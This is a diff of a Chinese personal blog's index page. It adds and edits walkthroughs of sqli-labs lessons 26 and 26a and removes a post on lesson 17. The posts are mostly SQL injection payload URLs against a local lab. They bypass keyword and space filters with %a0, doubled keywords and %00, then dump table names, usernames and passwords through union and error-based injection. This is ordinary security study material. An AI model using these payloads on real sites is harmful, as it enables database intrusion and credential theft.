@@ -64,6 +64,44 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-26a" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/16/sql-labs-Less-26a/" class="article-date">
+  <time datetime="2021-02-16T14:58:09.000Z" itemprop="datePublished">2021-02-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/16/sql-labs-Less-26a/">sql-labs-Less-26a</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/%EF%BC%8C%E4%BB%8E%E9%A1%B5%E9%9D%A2%E4%B8%8A%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E8%B7%9FLess-26%E4%B8%80%E6%A0%B7%E6%9C%89%E4%B8%80%E4%BA%9B%E5%AD%97%E7%AC%A6%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%E3%80%82">http://127.0.0.1/sql/Less-26a/，从页面上可以看到跟Less-26一样有一些字符被过滤了。</a><br>输入?id=1,正常，在输入’，出现错误且没有回显，说明不能用报错注入了。<br>再输入’，正常输出，但注入字符并不是’而是’)，因为输入’);%00正常输出。<br>接下来就是用联合注入法了，记得把空格换成%a0。</p>
+<p>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0oorrder%a0by%a03;%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0oorrder%a0by%a03;%00</a><br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,2,3;%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,2,3;%00</a><br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,database(),3;%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,database(),3;%00</a><br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00</a><br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00</a><br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),(select%a0group_concat(passwoorrd)%a0from%a0users);%00">http://127.0.0.1/sql/Less-26a/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),(select%a0group_concat(passwoorrd)%a0from%a0users);%00</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/16/sql-labs-Less-26a/" data-id="ckl85tp9k0000igux7bn551xl" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-26" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/16/sql-labs-Less-26/" class="article-date">
@@ -91,7 +129,7 @@
 <p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/16/sql-labs-Less-26/2.png" alt="2"><br>发现还对其他字符进行了过滤。</p>
 <p>1)(不考虑空格)因为报错了，所以我们可以用报错注入（也有在Apache环境下空格符无法正常转码（即不能使用空格）的原因）。</p>
 <p>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;">http://127.0.0.1/sql/Less-26/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,database())) || ‘<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;">http://127.0.0.1/sql/Less-26/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))))||’<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;">http://127.0.0.1/sql/Less-26/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’))))||’<br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;">http://127.0.0.1/sql/Less-26/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(select(group_concat(id))from(users))))||’<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;">http://127.0.0.1/sql/Less-26/?id=1&#39;</a> ||  extractvalue(1,concat(0x7e,(select(concat_ws(0x7e,username,passwoorrd))from(users)where(id=1))))||’</p>
-<p>2)(考虑空格)联合注入（可以用%a0和%0d代替空格(不知道为什么我都不能用)）<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0oorrder%a0by%a03;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0oorrder%a0by%a03;%00</a><br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,2,3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,2,3;%00</a><br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,database(),3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,database(),3;%00</a><br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00</a><br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00</a><br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),(select%a0group_concat(passwoorrd)%a0from%a0users);%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),(select%a0group_concat(passwoorrd)%a0from%a0users);%00</a></p>
+<p>2)(考虑空格)联合注入（可以用%a0和%0d代替空格(不知道为什么我都不能用但网上的教程都能用)）<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0oorrder%a0by%a03;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0oorrder%a0by%a03;%00</a><br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,2,3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,2,3;%00</a><br>爆库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,database(),3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,database(),3;%00</a><br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#39;security&#39;),3;%00</a><br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#39;users&#39;),3;%00</a><br>爆字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),(select%a0group_concat(passwoorrd)%a0from%a0users);%00">http://127.0.0.1/sql/Less-26/?id=1&#39;%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),(select%a0group_concat(passwoorrd)%a0from%a0users);%00</a></p>
 
       
     </div>
@@ -486,54 +524,6 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
 
 
   
-    <article id="post-sql-labs-Less-17" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/09/sql-labs-Less-17/" class="article-date">
-  <time datetime="2021-02-09T08:35:56.000Z" itemprop="datePublished">2021-02-09</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/09/sql-labs-Less-17/">sql-labs-Less-17</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1>Less-17</h1>
-
-<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-17/%EF%BC%8C%E6%98%BE%E7%A4%BA%E5%A6%82%E4%B8%8B%EF%BC%9A">http://127.0.0.1/sql/Less-17/，显示如下：</a></p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/1.png" alt="1"><br>在username里输入admin，password里输入1’（这里是因为不知道密码）,报错了：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/2.png" alt="2"><br>再把password的1’改成1’#。正常输出，说明可以用’注入。<br>接下来就在password那里进行注入可以用布尔盲注、延时注入和报错注入。<br>然后求出表名：users，列名：username和password。</p>
-<h1>小结</h1>
-1.这次我们为什么不在username进行注入而是在password进行注入呢？
-
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/3.png" alt="3"><br>我们查看源代码发现一个check_input()函数。<br>check_input()函数有什么用呢,先说一下下面这些函数：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/4.png" alt="4"><br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/5.png" alt="5"><br>在我们less17的check_input()中，对username进行各种转义的处理，所以此处不能使用username进行注入。</p>
-<p>2.报错注入<br>select extractvalue(1,concat(0x7e,(构造的语句),0x7e));<br>//select extractvalue(1,concat(0x7e,(select database()),0x7e));</p>
-<p>select updatexml(1,concat(0x7e,(构造的语句),0x7e),1);<br>//select updatexml(1,concat(0x7e,(select database()),0x7e),1);</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/09/sql-labs-Less-17/" data-id="ckky8po0o00006oux6wfogw23" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -570,6 +560,10 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
       <ul>
         
           <li>
+            <a href="/2021/02/16/sql-labs-Less-26a/">sql-labs-Less-26a</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/16/sql-labs-Less-26/">sql-labs-Less-26</a>
           </li>
         
@@ -583,10 +577,6 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
         
           <li>
             <a href="/2021/02/14/sql-labs-Less-24/">sql-labs-Less-24</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/13/sql-labs-Less-23/">sql-labs-Less-23</a>
           </li>
         
       </ul>
